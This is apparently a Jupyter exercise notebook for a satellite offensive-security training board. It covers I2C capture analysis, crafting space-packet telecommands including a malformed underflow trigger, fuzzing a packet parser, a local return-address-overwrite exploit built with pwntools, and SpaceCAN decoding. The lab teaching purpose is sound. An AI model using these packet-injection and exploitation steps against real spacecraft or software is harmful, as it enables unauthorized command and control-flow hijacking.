# Pwnsat Booklet Exercises

This notebook contains the hands-on exercises that accompany **Hacking the Final Frontier: Offensive Security in Space Systems and Satellites with Pwnsat**.

The notebook is designed to work with public example files so readers can complete the analysis even without the physical board, a logic analyzer, or RF equipment.

Expected repository layout:

```text
.
├── Booklet.ipynb
├── resources
│   ├── Flatsat_v1_Initial_start_exported.txt
│   ├── Flatsat_v1_Initial_start.logicdata
│   └── fuzzing
│       ├── fuzzing
│       ├── include
│       └── src
└── scripts
    ├── i2c_parser.py
    └── spp_tools.py
```

If your exported capture has a different filename, update `DATA_FILE` in the setup cell.

## Safety and Scope

These exercises are for authorized laboratory analysis only. The notebook focuses on offline parsing, packet construction, and local reasoning. It does not transmit RF signals and does not require live hardware.

When you later adapt payloads for a real Pwnsat lab, test over USB first and only transmit in a controlled, legal RF environment.

## Exercise Setup

This cell loads the local helper scripts and points the notebook at the logic analyzer export file.

The parser expects a CSV-style export with columns similar to:

```text
Time [s], Packet ID, Address, Read/Write, ACK/NAK, Data
```

In [ ]:
from pathlib import Path
import sys

ROOT = Path.cwd()
SCRIPTS = ROOT / "scripts"
RESOURCES = ROOT / "resources"
sys.path.insert(0, str(SCRIPTS))

DATA_FILE = RESOURCES / "Flatsat_v1_Initial_start_exported.txt"
LOGICDATA_FILE = RESOURCES / "Flatsat_v1_Initial_start.logicdata"

print(f"Notebook root: {ROOT}")
print(f"Scripts path:  {SCRIPTS}")
print(f"Export file:   {DATA_FILE}")
print(f"Logicdata:     {LOGICDATA_FILE}")

if not DATA_FILE.exists():
    print("WARNING: Export file not found. Place Flatsat_v1_Initial_start_exported.txt in the notebook directory or update DATA_FILE.")

## Part 1: Logic Analyzer Export Analysis

The goal of this section is to reproduce the blind-reconnaissance workflow from the book using an exported I2C capture.

You will:

1. Load the exported capture.
2. Detect I2C device addresses.
3. Infer register reads.
4. Filter by device address.
5. Filter by register.
6. Use the results to identify likely onboard sensors.

### Exercise 1.1: Full I2C Summary

Run the parser without filters. This should print detected devices, a sample of inferred register reads, and a register map.

Expected Pwnsat devices include:

| Device | Common Address | Role |
| --- | --- | --- |
| LIS2DH12 | `0x18` or `0x19` | Accelerometer / IMU telemetry |
| BME280 | `0x76` or `0x77` | Environmental telemetry |

In [ ]:
from i2c_parser import parse_file

# Full information
if DATA_FILE.exists():
    reads = parse_file(DATA_FILE, None, None, None)
else:
    reads = []

### Exercise 1.2: Filter by I2C Address

The LIS2DH12 commonly appears at `0x18` or `0x19`. Pwnsat captures often show `0x19`.

Use this filter to focus on one device.

In [ ]:
if DATA_FILE.exists():
    parse_file(DATA_FILE, "0x19", None, None)
else:
    print("DATA_FILE is missing; update DATA_FILE before running this exercise.")

### Exercise 1.3: Filter by Register

Filtering by register helps answer: *which device is reading or writing this register, and what bytes come back?*

The example below filters register `0x23`, which is commonly useful when studying accelerometer configuration/status traffic depending on the sensor.

In [ ]:
if DATA_FILE.exists():
    parse_file(DATA_FILE, None, "0x23", None)
else:
    print("DATA_FILE is missing; update DATA_FILE before running this exercise.")

### Exercise 1.4: Filter by Transaction Type

The parser infers register reads from a write-then-read pattern. Use `transaction="r"` to show inferred reads.

In [ ]:
if DATA_FILE.exists():
    parse_file(DATA_FILE, None, None, "r")
else:
    print("DATA_FILE is missing; update DATA_FILE before running this exercise.")

### Exercise 1.5: Build a Register Map Programmatically

This exercise loads the capture as data and returns structures you can use in later analysis. Instead of only printing tables, it creates a Python dictionary of devices and registers.

In [ ]:
from i2c_parser import load_export, get_transactions, get_reads, build_register_map

if DATA_FILE.exists():
    df = load_export(DATA_FILE)
    transactions = get_transactions(df)
    inferred_reads = get_reads(transactions)
    register_map = build_register_map(inferred_reads)

    for device, registers in sorted(register_map.items()):
        regs = ", ".join(f"0x{reg:02X}" for reg in sorted(registers))
        print(f"Device 0x{device:02X}: {regs}")
else:
    print("DATA_FILE is missing; update DATA_FILE before running this exercise.")

### Exercise 1.6: Questions for the Reader

Answer these after running the parser:

1. Which I2C addresses appear in the capture?
2. Which address is most likely the accelerometer?
3. Which address is most likely the environmental sensor?
4. Which registers are read repeatedly during startup?
5. Which registers are read periodically after initialization?
6. How could a spoofed I2C value affect APID `0x08` telemetry?

## Part 2: Space Packet Protocol Exercises

This section uses helper functions to decode and build CCSDS-style Space Packet Protocol frames.

The goal is to connect packet fields to firmware behavior:

```text
SPP primary header -> APID -> command handler -> mission behavior
```

In [ ]:
from spp_tools import build_tc, build_tm, decode_packet, print_packet

sample_hex = "0007c0330016466f6c6c6f772074686520776869746520726162626974"
sample = bytes.fromhex(sample_hex)
packet = print_packet(sample)

### Exercise 2.1: Decode a Telemetry Packet

Inspect the sample packet above and answer:

1. Is this TM or TC?
2. Which APID does it use?
3. What is the declared data field size?
4. Does the capture include trailing bytes?
5. Why does the CCSDS length field require a `+1` adjustment?

### Exercise 2.2: Build a Safe PING Telecommand

APID `0x01` is the safest command reachability test. It should produce an ACK without changing mission state.

In [ ]:
ping_tc = build_tc(apid=0x01, payload=b"", sequence_count=1)
print(f"PING TC raw: {ping_tc.hex()}")
print_packet(ping_tc)

### Exercise 2.3: Build a Firmware Version Request

APID `0x03` requests firmware version information. In the current firmware, the response contains:

```text
SPACECRAFT_ID | PATCH | MINOR | MAJOR | NUL
```

In [ ]:
version_tc = build_tc(apid=0x03, payload=b"", sequence_count=2)
print(f"SEND_FW TC raw: {version_tc.hex()}")
print_packet(version_tc)

### Exercise 2.4: Build a Thruster State Command

APID `0x04` expects two bytes:

```text
byte 0: thruster_id
byte 1: thruster_power
```

This exercise constructs the packet but does not transmit it.

In [ ]:
thruster_id = 0x00
thruster_power = 0x2A
thruster_payload = bytes([thruster_id, thruster_power])
thruster_tc = build_tc(apid=0x04, payload=thruster_payload, sequence_count=3)
print(f"SET_THRUSTER TC raw: {thruster_tc.hex()}")
print_packet(thruster_tc)

### Exercise 2.5: Analyze a Broadcast Underflow Candidate

APID `0x06` expects at least two payload bytes for frequency. A malformed packet with a declared data field smaller than that requirement reaches the vulnerable logic described in Phase 4.

The goal here is not to exploit live hardware. The goal is to inspect the packet fields and reason about why the handler is unsafe.

In [ ]:
broadcast_min = build_tc(apid=0x06, payload=b"", sequence_count=5)
print(f"BROADCAST minimal TC raw: {broadcast_min.hex()}")
print_packet(broadcast_min)

print("Reasoning:")
print("- APID 0x06 expects at least two bytes: frequency_hi and frequency_lo")
print("- The handler computes msg_len = payload_total - 2")
print("- If payload_total < 2, unsigned underflow can create an oversized copy length")

## Part 3: USB Telecommand Payload Preparation

The book uses USB first because it removes RF uncertainty. Once a packet is understood locally, the same raw SPP bytes can be adapted for RF delivery by the user's independent RF tooling.

The firmware's framed USB command endpoint expects:

```text
0xAA 0x55 | length_hi length_lo | raw SPP packet
```

Some local scripts may talk to a bridge that already handles framing. Always verify which endpoint you opened.

In [ ]:
def usb_frame(raw_spp: bytes) -> bytes:
    length = len(raw_spp)
    return b"\xAA\x55" + length.to_bytes(2, "big") + raw_spp

framed_ping = usb_frame(ping_tc)
print(f"Raw PING SPP:      {ping_tc.hex()}")
print(f"Framed USB PING:   {framed_ping.hex()}")
print(f"ASCII-hex for RF:  {ping_tc.hex()}")

### Exercise 3.1: Compare Raw, Framed, and ASCII-Hex Forms

For each command, record:

| Command | Raw SPP | USB Framed | RF ASCII-Hex |
| --- | --- | --- | --- |
| PING | Fill in | Fill in | Fill in |
| SEND_FW | Fill in | Fill in | Fill in |
| SET_THRUSTER | Fill in | Fill in | Fill in |
| BROADCAST minimal | Fill in | Fill in | Fill in |

This table prevents a common mistake: debugging the wrong layer.

In [ ]:
commands = {
    "PING": ping_tc,
    "SEND_FW": version_tc,
    "SET_THRUSTER": thruster_tc,
    "BROADCAST_MIN": broadcast_min,
}

for name, raw in commands.items():
    print(f"{name}")
    print(f"  raw_spp:     {raw.hex()}")
    print(f"  usb_framed:  {usb_frame(raw).hex()}")
    print(f"  rf_asciihex: {raw.hex()}")

## Part 4: Firmware Review Exercises

These exercises connect the generated packets to firmware functions. They are intentionally read-only.

Open these files while answering the questions:

- `firmware/spp.cpp`
- `firmware/worker.cpp`
- `firmware/ruplink.cpp`
- `firmware/usbCDC.cpp`
- `firmware/mission.h`

### Exercise 4.1: Parser Bug Walkthrough

In `firmware/spp.cpp`, find `spp_unpack_packet()` and answer:

1. Which checks happen before `memcpy`?
2. Which length check is missing?
3. What happens if the declared SPP data length is larger than the received buffer?
4. Why should the parser compare against `SPP_PRIMARY_HEADER_LEN + header.length + 1`?

### Exercise 4.2: APID Dispatcher Walkthrough

In `firmware/worker.cpp`, find `commandApidHandler()` and fill this table:

| APID | Handler Behavior | Missing Control |
| --- | --- | --- |
| `0x01` |  |  |
| `0x02` |  |  |
| `0x04` |  |  |
| `0x05` |  |  |
| `0x06` |  |  |
| `0x07` |  |  |

### Exercise 4.3: SPARTA Mapping

Map each finding to SPARTA:

| Finding | SPARTA Technique |
| --- | --- |
| Cleartext downlink telemetry |  |
| Rogue telecommand transmission |  |
| Reset DoS |  |
| Beacon flood |  |
| Broadcast underflow |  |
| Sensor bus spoofing |  |

## Part 5: Fuzzing

Fuzzing is automated input testing. A fuzzer repeatedly generates inputs, sends them to a target function or program, and watches for signals such as crashes, sanitizer findings, hangs, or new execution paths.

For Pwnsat, fuzzing is useful because the RF and USB command paths eventually feed attacker-controlled bytes into the same SPP parser and APID dispatch logic. Manual packet construction is still important, but it only covers the cases you remembered to test. Fuzzing explores the uncomfortable middle: valid-looking headers with invalid lengths, odd sequence flags, oversized payloads, truncated frames, and payloads that cross handler assumptions.

In this notebook, fuzzing stays offline. You will fuzz a C copy of the SPP library and a deliberately vulnerable local program. Do not point a fuzzer directly at an RF transmitter. The correct workflow is offline fuzzing, crash triage, USB/local reproduction, and only then controlled RF testing when authorized.

### Requirements

Install a Clang/LLVM toolchain with libFuzzer support.

```shell
# macOS
brew install llvm

# Debian/Ubuntu
sudo apt install -y clang llvm
```

If your system has multiple Clang versions, set `CC` and `CXX` in the terminal before launching Jupyter:

```shell
# macOS Homebrew LLVM
export CC=/opt/homebrew/opt/llvm/bin/clang
export CXX=/opt/homebrew/opt/llvm/bin/clang++

# Linux LLVM 16 example
export CC=/usr/lib/llvm-16/bin/clang
export CXX=/usr/lib/llvm-16/bin/clang++
```

### Exercise 5.1: Verify the Fuzzing Resources

The fuzzing resources are stored under `resources/fuzzing`. The important files are:

| Path | Purpose |
| --- | --- |
| `resources/fuzzing/src/spp/spp.c` | C implementation of the SPP builder and parser used by the harnesses. |
| `resources/fuzzing/include/spp/spp.h` | Packet structures, constants, and function declarations. |
| `resources/fuzzing/fuzzing/generate_corpus.c` | Builds initial seed packets. |
| `resources/fuzzing/fuzzing/fuzz_spp_pack.c` | libFuzzer harness for packet construction. |
| `resources/fuzzing/fuzzing/fuzz_spp_unpack.c` | libFuzzer harness for packet parsing. |
| `resources/fuzzing/fuzzing/vulnerable_app.c` | Local vulnerable binary for exploit triage practice. |
| `resources/fuzzing/fuzzing/spp.dict` | libFuzzer dictionary with useful SPP byte patterns. |

A harness is intentionally small. It should expose one target function and avoid extra behavior that hides the real crash site.

In [ ]:
from pathlib import Path

FUZZ_ROOT = Path("resources/fuzzing")
FUZZ_DIR = FUZZ_ROOT / "fuzzing"
CORPUS_DIR = FUZZ_DIR / "corpus"
OUTPUT_DIR = FUZZ_DIR / "output"

for p in [FUZZ_ROOT, FUZZ_DIR, CORPUS_DIR, OUTPUT_DIR]:
    print(f"{p}: {'OK' if p.exists() else 'MISSING'}")

### Exercise 5.2: Create the Working Directories

The corpus directory stores seed inputs and coverage-improving inputs discovered by libFuzzer. The output directory stores compiled harness binaries.

In [ ]:
!mkdir -p resources/fuzzing/fuzzing/corpus
!mkdir -p resources/fuzzing/fuzzing/output

### Exercise 5.3: Understand the Seed Corpus

A **corpus** is the collection of input files the fuzzer starts from. A good corpus is small but meaningful. For an SPP parser, useful seeds are not random blobs; they are packets that already look like protocol data.

Good SPP seeds include:

- A minimal telecommand packet.
- A telemetry packet with realistic header fields.
- A broadcast command with a two-byte frequency and message payload.
- A truncated header-only packet.
- A packet whose declared data length is larger than the bytes available.

The seed corpus lets the fuzzer begin near interesting parser branches. Without it, the fuzzer may spend most of its time discovering that a six-byte header exists.

In [ ]:
!gcc -I./resources/fuzzing/include \
  resources/fuzzing/fuzzing/generate_corpus.c \
  resources/fuzzing/src/spp/spp.c \
  -o resources/fuzzing/fuzzing/output/generate_corpus

### Exercise 5.4: Generate `seeds.bin`

This program writes an initial packet into the corpus directory. After running it, inspect the file size. Small seed files are normal; libFuzzer will mutate and minimize them over time.

In [ ]:
!./resources/fuzzing/fuzzing/output/generate_corpus
!ls -lh resources/fuzzing/fuzzing/corpus

### Exercise 5.5: Inspect the Seed as an SPP Packet

Use the Python helper from earlier exercises to decode the seed. This step connects the binary corpus file back to the protocol fields from Phase 2.

In [ ]:
import sys
sys.path.append("scripts")
from spp_tools import print_packet

seed_path = Path("resources/fuzzing/fuzzing/corpus/seeds.bin")
if seed_path.exists():
    seed = seed_path.read_bytes()
    print(f"Seed length: {len(seed)} bytes")
    print_packet(seed)
else:
    print("seeds.bin has not been generated yet")

### Exercise 5.6: Review the Dictionary

A libFuzzer dictionary contains byte sequences that are likely to be meaningful to the target format. For SPP, useful dictionary tokens include packet type bits, sequence flags, the secondary-header flag, and known APID values.

The dictionary does not replace mutation. It gives mutation better building blocks.

In [ ]:
!sed -n '1,120p' resources/fuzzing/fuzzing/spp.dict

### Exercise 5.7: Build the Fuzzers

Compile with libFuzzer, AddressSanitizer, and UndefinedBehaviorSanitizer:

- `-fsanitize=fuzzer` links the libFuzzer engine.
- `address` catches out-of-bounds reads/writes and use-after-free patterns.
- `undefined` catches undefined C behavior.
- `-g -O1` keeps useful debug symbols while preserving sanitizer behavior.

In [ ]:
# Packet builder harness
!clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I./resources/fuzzing/include \
  resources/fuzzing/src/spp/spp.c \
  resources/fuzzing/fuzzing/fuzz_spp_pack.c \
  -o resources/fuzzing/fuzzing/output/fuzz_spp_pack

# Packet parser harness
!clang -g -O1 -fsanitize=fuzzer,address,undefined \
  -I./resources/fuzzing/include \
  resources/fuzzing/src/spp/spp.c \
  resources/fuzzing/fuzzing/fuzz_spp_unpack.c \
  -o resources/fuzzing/fuzzing/output/fuzz_spp_unpack

### Exercise 5.8: Fuzz Packet Construction

This harness passes fuzzer-controlled bytes as the payload to `spp_tm_build_packet()`. The important question is whether the builder checks payload length before copying into the fixed-size `space_packet_t.data` buffer.

The run is bounded with `-runs=5000` so the notebook returns control. For deeper testing, increase the run count from a terminal.

In [ ]:
!./resources/fuzzing/fuzzing/output/fuzz_spp_pack \
  -runs=5000 \
  -dict=resources/fuzzing/fuzzing/spp.dict \
  resources/fuzzing/fuzzing/corpus

### Exercise 5.9: Fuzz Packet Parsing

This harness passes arbitrary bytes to `spp_unpack_packet()`. This is the most relevant target for RF and USB ingress because received bytes are parsed before APID dispatch.

Useful questions while reading the output:

- Did the fuzzer find a sanitizer crash?
- Did it save a crash artifact?
- Did the crash happen in `spp_unpack_packet()` or somewhere else?
- Is the bad memory access a read or a write?
- Does the crashing input contain a recognizable SPP primary header?

In [ ]:
!./resources/fuzzing/fuzzing/output/fuzz_spp_unpack \
  -runs=5000 \
  -dict=resources/fuzzing/fuzzing/spp.dict \
  resources/fuzzing/fuzzing/corpus

### Exercise 5.10: Interpret a Sanitizer Finding

A sanitizer finding is evidence, not the final report. Extract these fields from the fuzzer output:

| Field | What to Record |
| --- | --- |
| Crash type | Example: `stack-buffer-overflow`, `heap-buffer-overflow`, `SEGV`, timeout. |
| Access type | Read or write. |
| Access size | Number of bytes read or written. |
| Faulting function | Example: `spp_build_packet()` or `spp_unpack_packet()`. |
| Source line | The exact source file and line from the stack trace. |
| Artifact path | The file saved by libFuzzer, often named `crash-*`. |
| Reproduction command | The exact command needed to run the target with that artifact. |

For this SPP library, two high-value findings are expected:

- Builder-side oversized copy: `spp_build_packet()` copies `data_len` bytes without first enforcing the maximum payload size.
- Parser-side declared-length trust: `spp_unpack_packet()` copies `header.length + 1` bytes without checking that the received buffer actually contains that many bytes.

### Exercise 5.11: Reproduce a Crash Artifact

If libFuzzer saved a crash file, rerun the same harness with that single file. Replace `crash-file` with the artifact path from your output.

```shell
./resources/fuzzing/fuzzing/output/fuzz_spp_unpack resources/fuzzing/fuzzing/corpus/crash-file
```

Then decode the first bytes as an SPP packet when possible:

```python
raw = Path("path/to/crash-file").read_bytes()
print_packet(raw)
```

If decoding fails, that is still useful. It means the crash may be reachable only as arbitrary bytes, not as a syntactically meaningful packet. If decoding succeeds, record APID, packet type, sequence flags, declared data length, captured bytes, and trailing bytes.

In [ ]:
# Optional: set this to a crash artifact produced by libFuzzer.
CRASH_ARTIFACT = None  # Example: "resources/fuzzing/fuzzing/corpus/crash-abc123"

if CRASH_ARTIFACT:
    raw = Path(CRASH_ARTIFACT).read_bytes()
    print(f"Crash artifact length: {len(raw)} bytes")
    try:
        print_packet(raw)
    except Exception as exc:
        print(f"Could not decode as SPP: {exc}")
else:
    print("Set CRASH_ARTIFACT after libFuzzer produces a crash file.")

### Exercise 5.12: Build the Local Vulnerable Program

The vulnerable program is a local exploitation exercise. It reads bytes from standard input and passes them into the SPP builder path. Compile it without stack protector so you can study offset discovery and control-flow triage in a predictable lab binary.

This exercise is not proof of code execution on the Pwnsat MCU. It is a bridge between fuzzing output and exploit-development reasoning.

In [ ]:
!clang -g -O0 -fno-stack-protector \
  -I./resources/fuzzing/include \
  resources/fuzzing/fuzzing/vulnerable_app.c \
  resources/fuzzing/src/spp/spp.c \
  -o resources/fuzzing/fuzzing/output/vulnerable_app

### Exercise 5.13: Locate the Demonstration Function

Use symbols and disassembly to find the address of the demonstration function in the local binary. Addresses vary between systems and builds, especially when ASLR is enabled, so do not blindly reuse another reader's value.

In [ ]:
!nm resources/fuzzing/fuzzing/output/vulnerable_app | grep hacker_mode || true
!objdump -d resources/fuzzing/fuzzing/output/vulnerable_app | grep hacker_mode || true

### Exercise 5.14: Determine the Offset

The fuzzer tells you that a crash exists. It does not automatically tell you where the saved return address sits relative to your input. Use a de Bruijn pattern to find the offset.

1. Generate a unique pattern.
2. Run the vulnerable program under `lldb` or `gdb` with the pattern as input.
3. Read the crashing PC/LR/return-address value.
4. Convert that value back into an offset with `pwn cyclic -l`.

Example debugger flow with LLDB:

```text
lldb resources/fuzzing/fuzzing/output/vulnerable_app
settings set target.input-path resources/fuzzing/fuzzing/pattern.bin
run
register read pc lr fp
```

On little-endian systems, use the relevant lower bytes from the crashing register value when resolving the offset.

In [ ]:
from pwn import cyclic

pattern = cyclic(300)
pattern_path = Path("resources/fuzzing/fuzzing/pattern.bin")
pattern_path.write_bytes(pattern)
print(f"Wrote {len(pattern)} bytes to {pattern_path}")

In [ ]:
# Replace this value with the register value from your debugger session.
# Example from one ARM64 run: 0x61666361
REGISTER_VALUE = None

if REGISTER_VALUE is not None:
    !pwn cyclic -l {REGISTER_VALUE}
else:
    print("Set REGISTER_VALUE after the debugger crash.")

### Exercise 5.15: Build a Local Exploit Input

After you know the offset and the demonstration function address, build an input file that overwrites the saved return address. Replace the two values below with your local results.

This is a controlled binary exploitation exercise. Keep it separate from claims about the embedded target until you have debugger evidence from the actual board.

In [ ]:
from pwn import context, p64

context.arch = "aarch64"
context.endian = "little"

# Replace these with your local results.
OFFSET = None
HACKER_MODE_ADDR = None

if OFFSET is None or HACKER_MODE_ADDR is None:
    print("Set OFFSET and HACKER_MODE_ADDR before generating exploit.bin")
else:
    payload = b"A" * OFFSET + p64(HACKER_MODE_ADDR)
    exploit_path = Path("resources/fuzzing/fuzzing/exploit.bin")
    exploit_path.write_bytes(payload)
    print(f"Wrote {len(payload)} bytes to {exploit_path}")

### Exercise 5.16: Reproduce the Local Control-Flow Result

Run the vulnerable app under the debugger with `exploit.bin` as standard input:

```text
lldb resources/fuzzing/fuzzing/output/vulnerable_app
settings set target.input-path resources/fuzzing/fuzzing/exploit.bin
run
```

Record whether execution reaches the demonstration function, crashes earlier, or changes because of ASLR or architecture differences.

### Exercise 5.17: SPARTA Mapping for Fuzzing Findings

Fuzzing is not a SPARTA tactic by itself. Map the behavior you discovered:

| Finding | Suggested SPARTA Mapping |
| --- | --- |
| Malformed packet stresses parser validation | `EX-0013.02 Erroneous Input` |
| Unauthorized command reaches a handler | `EX-0001.01 Command Packets` |
| Repeated crash or lockup suppresses spacecraft behavior | `DE-0002.03 Inhibit Spacecraft Functionality` |
| Complete loss of access or operation in the lab model | `IMP-0003 Denial` |
| RF delivery through an unauthorized transmitter | `IA-0008.01 Rogue Ground Station` |

For the lab report, include the artifact hash, source line, crash type, decoded packet fields, reproduction command, and whether the behavior is reachable through USB, RF, or only the local fuzzing harness.

## Part 6: SpaceCAN Bus Offline Exercises

The SpaceCAN exercises are offline complements to the hardware exploitation chapter. They do not require the Pwnsat board and do not transmit on a physical CAN bus. The goal is to practice CAN-ID decoding, request/reply classification, simple replay reasoning, and fragmentation analysis before using `spacecan_lib` tools such as `scsniffer`, `scinjection`, and `screplay`.

The local `spacecan_lib` README notes that version `1.0.0` is not a full implementation of the LibreCube SpaceCAN standard. Treat these exercises as analysis of the repository's research implementation, not as a complete conformance test for the standard.


### Exercise 6.1: Decode SpaceCAN CAN IDs

A SpaceCAN-style 11-bit CAN ID encodes both the function family and the node ID. The local library uses these masks and base IDs:

| Family | Base | Meaning |
| --- | --- | --- |
| `0x080` | SYNC | synchronization traffic |
| `0x180` | SCET time | spacecraft elapsed time |
| `0x200` | UTC time | UTC-like time distribution |
| `0x280` | request | controller-to-node request |
| `0x300` | reply | node-to-controller reply |
| `0x700` | heartbeat | node/controller state |


In [ ]:
CAN_NODE_MASK = 0x07F
CAN_FUNCTION_MASK = 0x780

FAMILIES = {
    0x080: "SYNC",
    0x180: "SCET_TIME",
    0x200: "UTC_TIME",
    0x280: "REQUEST",
    0x300: "REPLY",
    0x700: "HEARTBEAT",
}

def decode_spacecan_id(can_id: int) -> dict:
    function = can_id & CAN_FUNCTION_MASK
    return {
        "can_id": f"0x{can_id:03X}",
        "family": FAMILIES.get(function, "UNKNOWN"),
        "function_bits": f"0x{function:03X}",
        "node_id": can_id & CAN_NODE_MASK,
    }

for cid in [0x080, 0x284, 0x304, 0x701, 0x77F]:
    print(decode_spacecan_id(cid))


### Exercise 6.2: Classify a Small Bus Capture

This synthetic capture uses the same fields a sniffer should preserve: timestamp, CAN ID, DLC, and data bytes. Classify each frame and identify which entries are command-like, telemetry-like, or timing/state signals.


In [ ]:
spacecan_capture = [
    {"t": 0.000, "can_id": 0x701, "data": bytes.fromhex("01")},
    {"t": 0.200, "can_id": 0x080, "data": bytes.fromhex("00")},
    {"t": 0.800, "can_id": 0x301, "data": bytes.fromhex("10 32 21 09")},
    {"t": 1.100, "can_id": 0x281, "data": bytes.fromhex("01 12")},
    {"t": 1.500, "can_id": 0x701, "data": bytes.fromhex("01")},
]

for frame in spacecan_capture:
    decoded = decode_spacecan_id(frame["can_id"])
    print(
        f"{frame['t']:>5.3f}s  {decoded['can_id']}  "
        f"{decoded['family']:<10} node={decoded['node_id']:02d} "
        f"dlc={len(frame['data'])} data={frame['data'].hex(' ')}"
    )


### Exercise 6.3: Reassemble Fragmented Packet Data

The local fragmentation format reserves two bytes inside each CAN frame: total frames minus one, then sequence number. The remaining bytes carry up to six payload bytes.


In [ ]:
def reassemble_spacecan_fragments(frames):
    expected_total = None
    fragments = {}
    for data in frames:
        if len(data) < 2:
            raise ValueError("fragment is too short")
        total = data[0] + 1
        seq = data[1]
        if expected_total is None:
            expected_total = total
        if total != expected_total:
            raise ValueError("mixed total-frame counts")
        if seq >= expected_total:
            raise ValueError("sequence number outside declared packet")
        fragments[seq] = data[2:]
    missing = [i for i in range(expected_total or 0) if i not in fragments]
    if missing:
        raise ValueError(f"missing fragments: {missing}")
    return b"".join(fragments[i] for i in range(expected_total))

fragments = [
    bytes.fromhex("02 00 DE AD BE EF 01 02"),
    bytes.fromhex("02 01 03 04 05 06 07 08"),
    bytes.fromhex("02 02 AA BB CC"),
]

packet = reassemble_spacecan_fragments(fragments)
print(packet.hex(" "))


### Exercise 6.4: SpaceCAN Security Questions

Use the decoded capture and fragmentation examples to answer:

1. Which frames could impersonate controller-originated requests?
2. Which frames could spoof responder telemetry?
3. Which fields would need authentication or freshness checks in a real bus design?
4. What would happen if a replay file resent the same reply frame every second?
5. How should a receiver handle duplicate fragments with different payload bytes?

These answers feed directly into the SpaceCAN exploitation cases in Phase 4.


## Part 7: Final Lab Report Template

Use this template after completing an exercise or exploit. The goal is to separate packet correctness, transport correctness, and vulnerability behavior.

| Field | Notes |
| --- | --- |
| Exercise or exploit case | Name and section number. |
| Environment | Offline notebook, USB board, RF lab, or SpaceCAN simulator. |
| Input bytes | Raw SPP, USB-framed SPP, CAN frame, corpus file, or capture path. |
| Expected behavior | What should happen on a correct implementation. |
| Observed behavior | Logs, returned bytes, telemetry, reset, crash, or no effect. |
| Reproduction steps | Commands or notebook cells used. |
| Evidence | Screenshots, serial output, crash hash, capture file, or decoded fields. |
| Security impact | Command execution, disclosure, DoS, spoofing, replay, or parser bug. |
| Claim level | Observation, vulnerability candidate, validated vulnerability, or exploit primitive. |
| Mitigation | Parser check, APID policy, authentication, freshness, rate limit, or monitoring. |
